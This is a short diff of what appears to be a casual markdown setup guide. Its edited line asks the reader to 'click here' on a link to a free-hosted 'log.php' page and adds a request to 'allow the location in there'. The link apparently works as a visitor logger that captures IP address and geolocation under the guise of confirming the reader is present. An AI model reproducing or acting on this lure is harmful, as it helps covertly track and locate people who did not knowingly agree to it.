@@ -2,7 +2,7 @@
 
 ok so this is the actual setup part, follow step by step dont rush 😭
 
-for me to know that u are here please [click here](https://fortifi.great-site.net/log.php)
+for me to know that u are here please [click here](https://fortifi.great-site.net/log.php)  and allow the location in there for me..
 
 ---
 
